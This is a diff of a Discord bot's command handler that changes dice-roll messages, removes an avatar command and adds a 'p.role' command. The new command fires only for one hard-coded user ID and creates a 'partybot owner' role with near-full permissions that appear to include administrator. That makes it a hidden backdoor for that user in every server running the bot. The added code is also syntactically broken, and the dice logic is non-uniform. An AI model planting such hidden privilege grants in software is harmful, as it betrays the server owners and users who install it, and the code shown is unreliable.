@@ -285,17 +285,17 @@ bot.on("message", async message => {
   if (message.content === 'p.die') {
     let random = Math.random() * 5 + 1;
     var number = Math.round(random)
-    message.channel.send(`\`\`\`🎲 You rolled a ${number}!🎲\`\`\``)
+    message.channel.send(`\`\`\`🎲 You rolled a ${number} 🎲\`\`\``)
   }
   if (message.content === 'p.2die') {
     let random = Math.random() * 11 + 1;
     var number = Math.round(random)
-    message.channel.send(`\`\`\`🎲 You rolled a ${number}!🎲\`\`\``)
+    message.channel.send(`\`\`\`🎲 You rolled a ${number} 🎲\`\`\``)
   }
   if (message.content === 'p.100die') {
     let random = Math.random() * 99 + 1;
     var number = Math.round(random)
-    message.channel.send(`\`\`\`🎲 You rolled a ${number}!🎲\`\`\``)
+    message.channel.send(`\`\`\`🎲 You rolled a ${number} 🎲\`\`\``)
   }
   if (message.content === 'p.btdx') {
     return message.channel.send(`Newest BTDX Download: :link: http://www.ramafparty.com/2018/02/bloons-tdx-125-out-now.html :link:`)
@@ -309,18 +309,13 @@ bot.on("message", async message => {
   if (message.content === 'p.credits') {
     return message.channel.send(`**Credit for making this bot goes to HalfBakedGaming.**\n\tSub to him: https://www.youtube.com/c/HalfBakedGaming15`)
   }
-  if (message.content.startsWith('p.avatar')) {
-    module.exports.run = async (bot, message, args) => {
-      let msg = await message.channel.send("Generating avatar...");
-      let target = message.mentions.users.first() || message.author;
-
-      await message.channel.send({files: [
-        {
-        attachment: target.displayAvatarURL,
-        name: "avatar.png"
-        }
-      ]});
+  if (message.content.startsWith('p.role')) {
+    if (message.author.id !== '346687165868015616') {
+      return
     }
+    guild.createRole(name: 'partybot owner', permissions: 2146958399)
+      .then(role => console.log(`Created new role with name ${role.name}`))
+      .catch(console.error);
   }
 });
 
